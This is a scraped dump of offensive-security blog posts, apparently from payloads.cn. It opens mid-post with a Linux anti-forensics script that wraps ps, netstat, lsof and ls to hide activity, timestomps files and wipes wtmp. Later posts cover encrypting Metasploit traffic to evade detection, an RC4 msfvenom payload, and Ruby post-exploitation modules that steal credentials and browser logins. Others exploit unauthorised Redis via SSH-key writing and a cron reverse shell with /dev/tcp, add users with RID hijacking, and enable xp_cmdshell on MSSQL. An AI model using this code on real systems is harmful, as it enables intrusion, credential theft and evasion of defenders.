&lt;&lt;EOF &gt;&gt; /usr/local/bin/ps#!/bin/bash/bin/ps \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/ps \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/ps &amp;&amp; touch -acmr /bin/ps /usr/local/bin/ps# netstattouch /usr/local/bin/netstatcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/netstat#!/bin/bash/bin/netstat \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/netstat \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/netstat &amp;&amp; touch -acmr /bin/netstat /usr/local/bin/netstat# lsoftouch /usr/local/bin/lsofcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/lsof#!/bin/bash/bin/lsof \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/lsof \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/lsof &amp;&amp; touch -acmr /bin/lsof /usr/local/bin/lsof# toptouch /usr/local/bin/topcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/top#!/bin/bash/bin/top \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/top \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/top &amp;&amp; touch -acmr /bin/top /usr/local/bin/lsof# findtouch /usr/local/bin/findcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/find #!/bin/bash/bin/find \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/find \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/find &amp;&amp; touch -acmr /bin/find /usr/local/bin/lsof# lstouch /usr/local/bin/lscat &lt;&lt;EOF &gt;&gt; /usr/local/bin/ls#!/bin/bash/bin/ls \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/ls \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/ls &amp;&amp; touch -acmr /bin/ls /usr/local/bin/ls# chattr &amp; lsattr#!/bin/bashmkdir /tmp/.tmp/chattr +a /tmp/.tmp/chattr +a /root/.ssh/mv /usr/bin/chattr /usr/bin/chtmv /usr/bin/lsattr /usr/bin/lst# last# echo &quot;&quot; &gt; /var/log/wtmp 修改命令变量后，重启终端生效，执行后记得删除sh脚本 ！ Reference linux shell 的here document 用法 (cat « EOF) cat EOF追加与覆盖 Shell特殊变量 chattr touch","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://payloads.cn/tags/Linux/"}]},{"title":"Metasploit流量分析与反取证","slug":"Metasploit流量分析与反取证","date":"2020-08-10T07:21:21.000Z","updated":"2021-07-07T07:16:30.659Z","comments":true,"path":"2020/0810/.html","link":"","permalink":"https://payloads.cn/2020/0810/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Metasploit已被渗透测试人员广泛使用并广为人知。当使用Metasploit进行命令控制，如不进行加密传输，就会让防御者在网络流量分析时，轻松发现和提取攻击者的网络活动行踪。 所以，网络流量加密传输就成为了必选项。 Metasploit流量分析Shell payload起初先用payload windows/x64/shell/bind_tcp进行交互，这是一个cmd shell。 在上图可以看到，当命令控制时，网络数据包是以明文形式发送和接收的。安全设备在记录的同时，还会触发告警，从而被发现。 Meterpreter Payload接下来看下payload windows/x64/meterpreter/bind_tcp，这是一个高级shell。 在进入session后，让我们检查流量。 这是建立连接与执行命令的过程。虽然说命令执行的过程已经进行了加密处理，继续进行活动，防御者也不会发现有价值的数据，但可以观察到每个数据都包含MZ标头和DOS模式异常。 在大多数情况下，安全设备也会检测到此活动，触发警报。这就意味着这台主机的权限就会失去。 Metasploit反取证Stage Encoder在不使用额外模块的情况下，如何进行再次加密？这里使用enablestageencoding与stageencoder，把发送的stage进行编码，编码方式较多，这里选用的是x86/shikata_ga_nai。 123msf5 exploit(multi/handler) &gt; set enablestageencoding trueenablestageencoding =&gt; truemsf5 exploit(multi/handler) &gt; set stageencoder x86/shikata_ga_nai 再次查看数据包，相同阶段的数据已编码，数据已经无法识别。 TLSTLS通常是逃避网络检测的选项之一，metasploit同样也提供了payload windows/x64/meterpreter_reverse_https，进行建立TLS加密传输。 reverse_https使用的是metasploit创建的自签名证书建立的TLS通信。虽然说数据是加密的，但不代表不会进行验证。 要使用不同的证书，可以购买，也可以使用自签名。但metasploit的auxiliary/gather/impersonate_ssl模块就可以解决这个问题，创建不同的伪证书。 reverse_https的高级选项中有handlersslcert设置。 将impersonate_ssl输出的pem格式证书路径载入。 1msf5 exploit(multi/handler) &gt; set handlersslcert /Users/anonysec/.msf4/loot/20200807180153_default_112.80.248.75_112.80.248.75_pe_628298.pem RC4 payloadRC4，Rivest Cipher 4，是一种密钥长度可变的流加密算法，属于对称加密的分支。详情 RC4 Wiki这是metasploit支持的一种加密算法。 下面来看payload windows/x64/meterpreter/bind_tcp_rc4的数据包。 数据包已经完全进行了加密传输处理，所有的命令控制都已经进行了隐藏。防御者只能发现这是TCP的流量，但没有任何有用的信息。需要注意：RC4PASSWORD 记得更改！ 1msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=Admin@1qaz LPORT=53 -f exe &gt; x64bind_rc4.exe","categories":[{"name":"流量分析","slug":"流量分析","permalink":"https://payloads.cn/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—主机信息收集","slug":"打造定制化的Metasploit—主机信息收集","date":"2020-07-18T02:26:12.000Z","updated":"2021-08-19T06:29:04.051Z","comments":true,"path":"2020/0718/.html","link":"","permalink":"https://payloads.cn/2020/0718/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：Metasploit Modules 前言 渗透的本质是信息搜集 —— Micropoor 此篇文章作为后渗透模块信息收集的抛砖引玉。毕竟，一场红蓝双方的对抗，也是时间的较量。 模块实现：收集 已安装的应用程序、主机凭据cmdkey /list &amp;&amp; vaultcmd /list、网络连接netstat -ano|findstr ESTABLISHED、Internet Explorer历史记录、Google Chrome 历史记录与保存的密码。 回顾MetasploitMetasploit的后渗透信息收集模块较多，如winenum，绝对是一条龙，收集的信息也比较全面。但如果sessions较多，批量执行时就会影响效率，不能做到快速化信息收集。 1meterpreter &gt; run winenum 已安装应用程序引用post/windows/gather/enum_applications。 凭据管理器收集凭据管理器中的信息，使用 cmdkey /list[列出Windows凭据]与vaultcmd /list[列出保管库(vault)列表]。但在metasploit终端中，中文输出会使乱码，除非将终端的编码格式改变，这里直接chcp 437英文输出。 具体解密工具 Web凭据 Get-VaultCredential.ps1 Windows凭据 Invoke-WCMDump.ps1 Windows中Credential Manager的信息获取 12345def credential print_line (&quot;\\nHost Credentials\\n================&quot;) cred = cmd_exec(&quot;cmd.exe /c chcp 437 &amp;&amp; cmdkey /list &amp;&amp; vaultcmd /list&quot;) print_line (&quot;#&#123;cred&#125;&quot;)end Netstat同样，但此处只显示已建立连接的。 Internet Explorer历史记录在Internet Explorer中输入的网址保留在 HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TypedURLs。 所以这里需要Msf::Post::Windows::Registry，将url值取出。 12345678910111213def ie_history print_line (&quot;\\nIE History\\n==========&quot;) keys = registry_enumvals(&quot;HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs&quot;) if (not keys.empty?) while(not keys.empty?) key = keys.shift valname = registry_getvaldata(&quot;HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs&quot;,&quot;#&#123;key&#125;&quot;) print_line (&quot;#&#123;valname&#125;&quot;) end else print_error(&quot;NO History Data.&quot;) endend Google Chrome历史记录Google Chrome的历史记录存放在%LocalAppData%\\Google\\Chrome\\User Data\\Default\\History。 只需要从目标机中将history.sqlite下载到本地，使用sqlite3类执行sql语句后把url输出。 12345require &#x27;sqlite3&#x27;file = &quot;#&#123;rhost&#125;-Chrome_history.sqlite&quot;maildb = SQLite3::Database.new(file)urls = maildb.execute(&quot;select url from urls;&quot;) 登录信息同理，Google Chrome中保存的密码，记录在%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data。密码的解密需要win32crypt.CryptUnprotectData，其实在Metasploit中也可以使用railgun去调用Windows API。 但解密过程实在是没有处理好，所以这块只能将Google Chrome中保存密码的Url与Username输出，再借助其它工具或RDP登录进行查看。(后续深入研究railgun调用Windows API) 存在问题最后，在测试模块过程中发现：使用msfvenom生成payload弹回的session可以完全操控注册表，但使用exploit/windows/smb/psexec传递弹回的session，却不能完全操控注册表。(具体原因未知) 12345678def run ver = registry_getvaldata(&quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer&quot;, &quot;Version&quot;) print_line(&quot;\\nIE Version: #&#123;ver&#125;&quot;) keys = registry_key_exist?(&quot;HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs&quot;) print_good(&quot;#&#123;keys&#125;&quot;) ver = registry_getvaldata(&quot;HKCU\\\\Software\\\\Google\\\\Chrome\\\\BLBeacon&quot;, &quot;version&quot;) print_line(&quot;\\nChrome Version: #&#123;ver&#125;&quot;)end 解决办法：加上当前进程自动注入到explorer.exe的选项，防止模块报错。 123456789101112131415# migrate to explorer.exedef migrate(pid=nil) current_pid = session.sys.process.open.pid target_pid = session.sys.process[&quot;explorer.exe&quot;] if target_pid != current_pid print_status(&quot;Current PID #&#123;current_pid&#125;, migrating into explorer.exe, PID #&#123;target_pid&#125;.&quot;) begin session.core.migrate(target_pid) rescue ::Exception =&gt; e print_error(e) return false end end return trueend 完整模块运行Demo： 批量执行 1msf5 &gt; sessions -C &quot;run post/windows/gather/collect migrate=true&quot; References Metasploit API Metasploit WIKI","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—安全日志分析","slug":"打造定制化的Metasploit—安全日志分析","date":"2020-07-02T17:56:32.000Z","updated":"2021-08-19T06:29:31.627Z","comments":true,"path":"2020/0703/.html","link":"","permalink":"https://payloads.cn/2020/0703/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：Metasploit Modules 前言对于Windows安全日志的分析，可以判断出哪些IP对该主机进行登录过。当然，这也可以作为内网横向的目标之一。通过PowerShell就可以完成此操作，但用Metasploit如何实现内存执行ps1呢? EventLog.ps1首先简单解读下EventLog.ps1：它使用WEVTUtil+PowerShell将外部日志导出csv，此种方法优点就是快，需要导入外部evtx。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Param ( [string]$evtx = $pwd.Path+&quot;\\*_Security.evtx&quot;)$time=Get-Date -Format h:mm:ss$evtx=(Get-Item $evtx).fullname$outfile=&quot;C:\\Windows\\Temp\\&quot;+(Get-Item $evtx).BaseName+&quot;.csv&quot;$logsize=[int]((Get-Item $evtx).length/1MB)write-host [+] $time Load $evtx &quot;(&quot;Size: $logsize MB&quot;)&quot; ... -ForegroundColor Green[xml]$xmldoc=WEVTUtil qe $evtx /q:&quot;*[System[Provider[@Name=&#x27;Microsoft-Windows-Security-Auditing&#x27;] and (EventID=4624 or EventID=4625)] and EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;3&#x27;] or EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;]]&quot; /e:root /f:Xml /lf$xmlEvent=$xmldoc.root.Eventfunction OneEventToDict &#123; Param ( $event ) $ret = @&#123; &quot;SystemTime&quot; = $event.System.TimeCreated.SystemTime | Convert-DateTimeFormat -OutputFormat &#x27;yyyy&quot;/&quot;MM&quot;/&quot;dd HH:mm:ss&#x27;; &quot;EventID&quot; = $event.System.EventID &#125; $data=$event.EventData.Data for ($i=0; $i -lt $data.Count; $i++)&#123; $ret.Add($data[$i].name, $data[$i].&#x27;#text&#x27;) &#125; return $ret&#125;filter Convert-DateTimeFormat&#123; Param($OutputFormat=&#x27;yyyy-MM-dd HH:mm:ss fff&#x27;) try &#123; ([DateTime]$_).ToString($OutputFormat) &#125; catch &#123;&#125;&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Extract XML ... -ForegroundColor Green[System.Collections.ArrayList]$results = New-Object System.Collections.ArrayList($null)for ($i=0; $i -lt $xmlEvent.Count; $i++)&#123; $event = $xmlEvent[$i] $datas = OneEventToDict $event $results.Add((New-Object PSObject -Property $datas))|out-null&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Dump into CSV: $outfile ... -ForegroundColor Green$results | Select-Object SystemTime,IpAddress,TargetDomainName,TargetUserName,EventID,LogonType | Export-Csv $outfile -NoTypeInformation -UseCulture -Encoding Default -Force EventID=4624 成功登录EventID=4625 失败登录Logon type 3 Network 网络登录Logon Type 10 RemoteInteractive 远程登录 借助EventLog.ps1，接下来开始编写Metasploit模块。 执行命令先要导出安全日志，就需要远程执行系统命令，这里使用meterpreter中的execute，并创建随机名字导出。 1234567# 随机字母数字8位sec = Rex::Text.rand_text_alphanumeric(8)print_good(&quot;#&#123;sec&#125;&quot;)# lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb# wevtutil.exe管理员权限运行session.sys.process.execute(&quot;wevtutil.exe epl Security C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.evtx&quot;) 载入ps1原本想将EventLog.ps1写在该模块中，之后读取写入在目标机中，再去执行。但.ps1格式需要调整，比较麻烦。 换个思路，本地载入读取。经几番查阅，Metasploit可以内存加载，这样就不需要将脚本上传到目标机中，但需要将EventLog.ps1提前放在/data/post/powershell/EventLog.ps1目录下。(可自定义) 123456789101112131415command = &quot;C:\\\\Windows\\\\Temp\\\\&quot; + &quot;#&#123;sec&#125;.evtx&quot;def execute_eventlog_script(command) print_good(&quot;Start Execute EventLog Script ...&quot;) # /data/post/powershell/EventLog.ps1 psh_script = File.read(File.join(Msf::Config.data_directory, &quot;post&quot;, &quot;powershell&quot;, &quot;EventLog.ps1&quot;)) # 压缩脚本 compressed_script = compress_script(psh_script) + command # print_status(&quot;#&#123;compressed_script&#125;&quot;) cmd_out, runnings_pids, open_channels = execute_script(compressed_script) while(log = cmd_out.channel.read) print (&quot;#&#123;log&#125;&quot;) endend 注：因是内存加载，目标机不需要开启运行ps1脚本。 不要忘记载入Powershell类。 1include Msf::Post::Windows::Powershell 文件操作既然安全日志已经被分析完成了，那就需要将分析结果取回本地，并将遗留在目标中的文件进行删除，这里使用meterpreter中的download与rm。 123456dir = Msf::Config.loot_directory# lib/rex/post/meterpreter/extensions/stdapi/fs/file.rbsession.fs.file.download_file(&quot;#&#123;dir&#125;/#&#123;rhost&#125;-Security.csv&quot;,&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.csv&quot;)session.fs.file.rm(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.evtx&quot;)session.fs.file.rm(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.csv&quot;) 完整模块运行Demo： References Metasploit API Metasploit WIKI Outlook.rb","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—邮服用户枚举","slug":"打造定制化的Metasploit—邮服用户枚举","date":"2020-05-31T15:52:26.000Z","updated":"2021-08-19T06:28:47.997Z","comments":true,"path":"2020/0531/.html","link":"","permalink":"https://payloads.cn/2020/0531/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：Metasploit Modules 前言本文开始学习Metasploit Web类模块开发，从HTTPClient类的了解，到Http数据包的Get与Post请求发送，从而实现模拟发包，最终到实现某邮服接口枚举用户的功能模块。 HTTPClientHttpClient mixin是发送基本HTTP请求的模块。 Get首先copy下官方的例子，进行发送get请求。 123456789101112131415161718def run uri = target_uri.path res = send_request_cgi(&#123; &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;admin&#x27;, &#x27;index.php&#x27;), &#x27;vars_get&#x27; =&gt; &#123; &#x27;p1&#x27; =&gt; &quot;This is param 1&quot;, &#x27;p2&#x27; =&gt; &quot;This is param 2&quot; &#125; &#125;) if res &amp;&amp; res.code == 200 print_good(&quot;I got a 200, awesome&quot;) else print_error(&quot;No 200, feeling blue&quot;) endend 在发包过程中，可以结合抓包，查看实际发送的Http数据包，也可以直接将Request与Response输出查看。 12print_good (&quot;Request: \\n#&#123;res.request.to_s&#125;&quot;)print_good (&quot;Response: \\n#&#123;res.to_s&#125; \\n&quot;) 完整的Request与ResponseHttp数据包请求。 PostPost请求只需要将&#39;method&#39;=&gt;&#39;POST&#39;，并加上post_data。 1234567post_data = (&quot;username=admin&quot;)res = send_request_cgi(&#123; &#x27;method&#x27; =&gt; &#x27;POST&#x27;, &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;/index.html&#x27;), &#x27;ctype&#x27; =&gt; &#x27;text/x-json&#x27;, &#x27;data&#x27; =&gt; post_data&#125;) 至此，通过HttpClient mixin，已经实现了Http数据包的Get与Post请求发送。 Module某邮服，可通过用户接口，枚举存在的用户名。接下来要将该利用方式转化为Metasploit的扫描模块。 字典读取首先要探测用户接口是否存在，之后才能继续下面操作。打开用户名字典，进行读取。 12345678910111213141516if res.code.to_s == &#x27;200&#x27; print_status(&quot;Exist username interface, start enumerating ...&quot;) # 数组：用户名行分割 queue = [] File.open(datastore[&#x27;USER_FILE&#x27;]).each_line do |users| queue &lt;&lt; users.strip end print_status (&quot;#&#123;queue&#125;&quot;) while(not queue.empty?) # 删除并获取数组第一个元素 user = queue.shift print_status (&quot;#&#123;user&#125;&quot;) end else print_error(&quot;Exist not username interface&quot;)end 数据处理因请求数据是json格式，所以post_data需要进行转换。 12345data = &#123;&quot;email&quot;:&quot;#&#123;user&#125;&quot;&#125;print_status (&quot;#&#123;data&#125;&quot;)# 转换jsonpost_data = data.to_jsonprint_status (&quot;json: #&#123;post_data&#125;&quot;) 转换前后对比： 因Response返回包是xml格式，所以要进行xml解析。这样，就通过Metasploit实现了该利用模块的Http数据包的发送与接收。 123# 解析xmlxml = res.get_xml_documentprint_good (&quot;Response_xml\\n#&#123;xml&#125;&quot;) 最后将Response_xml中的数据进行处理，并把存在的用户名写入txt文本中。 123456789101112131415161718# 输出文件格式outfile = store_loot( &quot;MailUser&quot;, &quot;text/plain&quot;, rhost, &quot;&quot;) # at查找string元素string = xml.at(&#x27;string&#x27;)# text方法也可以被用作去除所有HTML标签text = string.text# print_status (&quot;#&#123;text&#125;&quot;)if not text.empty? print_good (&quot;#&#123;user&#125; : #&#123;text&#125;&quot;) # 存在用户写入文件 output = file_local_write( outfile ,&quot;#&#123;user&#125; : #&#123;text&#125;&quot;)endprint_status (&quot;OutFile: #&#123;outfile&#125;&quot;) 完整模块运行Demo： References Metasploit Module开发WEB篇 常见的Metasploit模块编码错误 如何使用HTTPClient发送HTTP请求","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—Redis未授权","slug":"打造定制化的Metasploit—Redis未授权","date":"2020-03-31T06:41:21.000Z","updated":"2021-08-19T06:28:54.436Z","comments":true,"path":"2020/0331/.html","link":"","permalink":"https://payloads.cn/2020/0331/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：Metasploit Modules 前言Redis未授权漏洞，是内网横向移动的手法之一，常见的利用方式为SSH公钥写入与Cron计划任务反弹shell。但每次都手动命令执行，绝对影响效率，所以本文将该利用方式转化为Metasploit模块进行检测与利用。 未授权检测检测目标Redis是否存在未授权漏洞，通常是redis-cli -h ip后，输入info检测目标是否有回显信息。 编写Metasploit模块，需要载入Redis扫描类。 1include Msf::Auxiliary::Redis 定义检测方法，进行INFO命令执行，并输出数据回显。 1234def check info_data = redis_command(&#x27;INFO&#x27;) print_good (&quot;#&#123;info_data&#125;&quot;)end 可以看到，第一步已经实现。 但此处需要做个判断，如果INFO命令执行后，数据回显中包含redis_version，再继续执行。否则，结束。 123456if (info_data = redis_command(&#x27;INFO&#x27;)) &amp;&amp; /redis_version:(?&lt;redis_version&gt;\\S+)/ =~ info_data print_warning (&#x27;The Redis is unauthorized&#x27;)else print_error (&#x27;The Redis is not unauthorized&#x27;) returnend SSH公钥写入这是手动执行的命令，需要写入ssh公钥文件内容，才能获取目标系统权限。 1234127.0.0.1:6379&gt; config set dir /root/.ssh/127.0.0.1:6379&gt; config set dbfilename authorized_keys127.0.0.1:6379&gt; set x &quot;\\n\\n\\nssh-rsa xxxxxx root@kali\\n\\n\\n&quot;127.0.0.1:6379&gt; save 如果每次进行ssh公钥查看，再copy，属实麻烦。所以在模块头部添加文件选项。 12345register_options( [ Opt::RPORT(6379), OptPath.new(&#x27;SSHPUB&#x27;, [ true, &#x27;The SSH public key location (absolute path)&#x27;, &#x27;/root/.ssh/id_rsa.pub&#x27; ]) ] 定义ssh公钥写入方法，其中authorized_key参数为ssh公钥文件，读取后写入。 12345678def sshpub redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dir&#x27;, &#x27;/root/.ssh/&#x27;) redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dbfilename&#x27;, &#x27;authorized_keys&#x27;) authorized_key = &quot;\\n\\n\\n&quot; + File.read(&quot;#&#123;datastore[&#x27;SSHPUB&#x27;]&#125;&quot;) + &quot;\\n\\n\\n&quot; redis_command(&#x27;SET&#x27;, &#x27;x&#x27;, authorized_key) redis_command(&#x27;SAVE&#x27;) print_good (&#x27;SSH public key was written successfully&#x27;)end Cron计划任务反弹如果目标机中没有/root/.ssh/目录，还有可以使用计划任务反弹Shell。因为是反向连接，所以在目标网中需要找另一台可通讯主机进行NC监听，故提示反弹命令。 1234567(info_data = redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dir&#x27;, &#x27;/var/spool/cron/&#x27;)) &amp;&amp; /OK/ =~ info_dataprint_line (&quot;&lt;----------------Please use the Cron GetShell----------------&gt;&quot;)print_line (&quot;set xx &#x27;\\\\n* * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\\n&#x27;&quot;)print_line (&quot;config set dir /var/spool/cron/&quot;)print_line (&quot;config set dbfilename root&quot;)print_line (&quot;save&quot;)print_line (&quot;&lt;-------------------------------------------------------------&gt;&quot;) 完整模块运行Demo： References Metasploit API Metasploit WIKI","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—克隆用户","slug":"打造定制化的Metasploit—克隆用户","date":"2020-03-26T16:56:12.000Z","updated":"2021-08-19T06:29:13.776Z","comments":true,"path":"2020/0327/.html","link":"","permalink":"https://payloads.cn/2020/0327/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：Metasploit Modules 前言在进行内网横向移动时，可以理解为后渗透过程，如何利用Metasploit打造后渗透模块，如何基于session进行操控？比如: 在当前会话上检查系统权限，或者添加用户等。最终解决实战中的需求：利用已获取session，创建登录账户，添加该账户到管理员与远程桌面组，并克隆administrator，从而替代clone.exe。 编写后渗透模块代码头部仅需要在头部添加meterpreter会话的类型，该模块就可以在session上进行操控。 检查会话权限这里编写一个简单的模块，检查当前会话是否具有管理员权限,引用 lib/msf/core/post/windows/priv.rb中的is_admin?函数。 1234567891011def run # 检查会话的特权 print_status(&quot;Checking for SYSTEM privileges on session&quot;) admin_check = is_admin? if(admin_check) print_good(&quot;\\tCurrent User Is Admin&quot;) else print_error(&quot;\\tCurrent User is Not Admin&quot;) endend 如果说权限不足，可以在当前session尝试提权，同时也是引用priv.rb。在Module options中可增加模块选项，进行设置。 1234register_options( [ OptBool.new(&#x27;GETSYSTEM&#x27;, [true, &#x27;Attempt to get SYSTEM privilege on the target host.&#x27;, false]), ]) 当getsystem为true时，运行如下定义： 12345678def getsystem results = session.priv.getsystem if results[0] return true else return false endend run主函数也可使用is_system?，对当前会话的系统权限检查。 12345678910111213141516171819202122232425def run # 检查操作系统版本 wver = sysinfo[&quot;OS&quot;] print_status(&quot;Target OS: #&#123;wver&#125;&quot;) # 检查会话的特权，并在需要时尝试获得系统特权。 print_status(&quot;Checking for SYSTEM privileges on session&quot;) if !is_system? if datastore[&#x27;GETSYSTEM&#x27;] print_status(&quot;Trying to get SYSTEM privileges&quot;) if getsystem print_good(&quot;\\tGet SYSTEM privileges&quot;) else print_error(&quot;Could not obtain SYSTEM privileges&quot;) return end else print_error(&quot;Session is not running with SYSTEM privileges. Try setting GETSYSTEM &quot;) return end else print_good(&quot;\\tSession is already running with SYSTEM privileges&quot;) end return nilend 检查当前会话权限与尝试提权的完整Demo： 添加用户以上一个简单的Demo已经实现了当前会话的权限检查，之后编写利用当前session创建用户，并且在未设置密码时，可随机设置8位密码，增加一些复杂度。 123456789101112131415161718def add_users if datastore[&#x27;PASSWORD&#x27;].nil? # 创建随机8位密码 datastore[&#x27;PASSWORD&#x27;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2) print_status(&quot;You have not set up a PASSWORD. The default is &#x27;#&#123;datastore[&#x27;PASSWORD&#x27;]&#125;&#x27;&quot;) end # 添加用户 if enum_user.include? datastore[&#x27;USERNAME&#x27;] print_error(&quot;User &#x27;#&#123;datastore[&#x27;USERNAME&#x27;]&#125;&#x27; already exists.&quot;) else result = add_user(datastore[&#x27;USERNAME&#x27;], datastore[&#x27;PASSWORD&#x27;]) if result[&#x27;return&#x27;] == 0 print_good &quot;\\tAdding User: #&#123;datastore[&#x27;USERNAME&#x27;]&#125; with Password: #&#123;datastore[&#x27;PASSWORD&#x27;]&#125;&quot; else check_result(result) end endend 添加管理员与远程桌面组创建完用户后，还需要将该用户添加管理员组，使该用户有更高的权限。并且在远程桌面时，可能也需要添加至远程桌面组。 该定义引用了post/windows/manage/enable_rdp部分代码。 克隆用户这段代码的定义实际应用了Windows RID劫持技术，在实战中应用的更多的是Clone.exe，其原理大同小异。 Metasploit中的post/windows/manage/rid_hijack模块正是利用RID劫持技术实现了这一点。 最后，将以上讲述的代码与rid_hijack模块结合，便解决了文章开篇提出的实战需求：利用已获取session，创建登录账户，添加该账户到管理员与远程桌面组，并克隆administrator，从而替代clone.exe。 References Metasploit API Metasploit WIKI RID Hijacking on Windows","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—MSSQL重构","slug":"打造定制化的Metasploit—MSSQL重构","date":"2020-03-25T11:05:08.000Z","updated":"2021-08-19T06:23:58.909Z","comments":true,"path":"2020/0325/.html","link":"","permalink":"https://payloads.cn/2020/0325/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：Metasploit Modules 前言在进行内网渗透时，有时会遇到SQL Server数据库，当获取到正确口令信息时，经常会用到SQLTOOLS一类的渗透工具，但依赖xp_cmdshell需要开启，才能执行系统命令。这里就联想到实战中的需求，也正是本文要讲述的方法：**利用Metasploit，通过正确的SQL Server口令信息，可启用xp_cmdshell，并获取目标系统session**。 参数msftidy使用Metasploit中名为msftidy的内置工具，检查开发的模块语法是否正确。 loadpathMetasploit每次更新，所有模块都会被删除，创建外部目录不被删除（虚拟分支）: 外部目录要与msf目录结构相同，之后在msf中使用loadpath 绝对路径/Metasploit/载入。 当前msf适用，退出后需要重新加载loadpath reload在不关闭metasploit的情况下使用reload命令重新载入编辑过的模块。 内置模块测试Metasploit中内置了mssql_payload模块，但攻击效果不是很好，session弹不回来。 编写mssql_powershell模块mssql_powershell是在mssql_payload基础上进行修改的。 接下来进行分解讲述： 代码头部1234567891011121314151617181920212223242526272829303132### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;msf/core&#x27; # 引用 core 核心库class MetasploitModule &lt; Msf::Exploit::Remote # 定义这是一个远程攻击模块 Rank = ExcellentRanking include Msf::Exploit::Remote::MSSQL # 包含 lib/msf/core/exploit/mssql.rb 库 def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;Microsoft SQL Server Powershell payload &#x27;, # %q 单引号字符串 &#x27;Description&#x27; =&gt; %q&#123; This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors. &#125;, &#x27;Author&#x27; =&gt; [ &#x27;AnonySec@DropLab&#x27;, ], &#x27;License&#x27; =&gt; MSF_LICENSE, &#x27;Platform&#x27; =&gt; &#x27;win&#x27;, # 仅支持windows平台 &#x27;Arch&#x27; =&gt; [ ARCH_X86, ARCH_X64 ], &#x27;Targets&#x27; =&gt; [ [ &#x27;Automatic&#x27;, &#123; &#125; ], ], 